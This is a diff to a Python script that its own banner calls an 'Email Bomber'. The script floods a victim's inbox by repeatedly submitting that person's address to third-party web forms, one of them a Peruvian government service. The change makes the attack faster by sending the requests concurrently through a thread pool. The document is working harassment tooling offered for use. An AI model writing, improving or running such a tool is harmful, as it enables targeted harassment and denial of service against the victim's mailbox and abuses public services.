@@ -3,17 +3,18 @@ import json
 import argparse
 import platform
 import os
+import concurrent.futures
 
-# sistema operativo
+# Detectar el sistema operativo
 if platform.system() == "Windows":
     clear_command = "cls"
 else:
     clear_command = "clear"
 
-#limpiar la consola
+# Ejecutar el comando para limpiar la consola
 os.system(clear_command)
 
-
+# Imprimir el mensaje de bienvenida
 print("                                      ***********************************************                                        ")
 print("                                      *                                             *                                        ")
 print("                                      *          KLAUS INC. - Email Bomber          *                                        ")
@@ -51,71 +52,34 @@ url4 = 'https://webexterno.sutran.gob.pe/WebExterno/Pages/SolicitudAIP/TramiteGe
 payload4 = {"codVerif":"Atención, Esto es un mensaje masivo de Klaus Inc. desarrollado por BotVHS","correo":email,"nroDoc":"44444444"}
 
 
+def make_request(url, payload, headers):
+    try:
+        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
+        if response.status_code == 200:
+            return True
+        else:
+            print(f"Error en la peticion a {email}. Codigo de estado: {response.status_code}")
+    except requests.exceptions.Timeout:
+        print(f"No se ha podido procesar esta petición")
+    return False
+
 contador_peticiones = 0
-for i in range(cantidad):
-    if contador_peticiones >= cantidad:
-        break
+with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
+    futures = []
+    for url, payload, headers in [(url1, payload1, headers1), (url2, payload2, headers2), (url3, payload3, {}), (url4, payload4, {})]:
+        for i in range(cantidad):
+            if contador_peticiones >= cantidad:
+                break
 
-    try:
-        response1 = requests.post(url1, data=json.dumps(payload1), headers=headers1, timeout=10)
-        if response1.status_code == 200:
+            futures.append(executor.submit(make_request, url, payload, headers))
             contador_peticiones += 1
-            print(f"Peticion {contador_peticiones} a {email} exitoso")
+
+
+        if contador_peticiones >= cantidad:
+            break
+
+    for future in concurrent.futures.as_completed(futures):
+        if future.result():
+            print(f"Peticion finalizada exitosamente")
         else:
-            print(f"Error en la peticion {contador_peticiones} a {email}. Codigo de estado: {response1.status_code}")
-        if contador_peticiones >= cantidad:
-            break
-    except requests.exceptions.Timeout:
-        print(f"No se ha podido procesar esta petición")
-        if contador_peticiones >= cantidad:
-            break
-        continue
-
-    try:
-        response2 = requests.post(url2, data=json.dumps(payload2), headers=headers2)
-        if response1.status_code == 200:
-            contador_peticiones += 1
-            print(f"Peticion {contador_peticiones} a {email} exitoso")
-        else:
-            print(f"Error en la API 2 a {email}. Codigo de estado: {response2.status_code}")
-        if contador_peticiones >= cantidad:
-            break
-    except requests.exceptions.Timeout:
-        print(f"No se ha podido procesar esta petición")
-        if contador_peticiones >= cantidad:
-            break
-        continue
-
-    
-    try:
-        response3 = requests.post(url3, data=json.dumps(payload3))
-        if response3.status_code == 200:
-            contador_peticiones += 1
-            print(f"Peticion {contador_peticiones} a {email} exitoso")
-        else:
-            contador_peticiones += 1
-            print(f"Error en la API 3 a {email}. Codigo de estado: {response2.status_code}")
-        if contador_peticiones >= cantidad:
-            break
-    except requests.exceptions.Timeout:
-        print(f"No se ha podido procesar esta petición")
-        if contador_peticiones >= cantidad:
-            break
-        continue
-
-    
-    try:
-        response4 = requests.post(url4, data=json.dumps(payload4))
-        if response4.status_code == 200:
-            contador_peticiones += 1
-            print(f"Peticion {contador_peticiones} a {email} exitoso")
-        else:
-            print(f"Error en la peticion {contador_peticiones} a {email}. Codigo de estado: {response4.status_code}")
-        if contador_peticiones >= cantidad:
-            break
-    except requests.exceptions.Timeout:
-        print(f"No se ha podido procesar esta petición")
-        if contador_peticiones >= cantidad:
-            break
-        continue
-
+            print(f"Peticion finalizada con error")
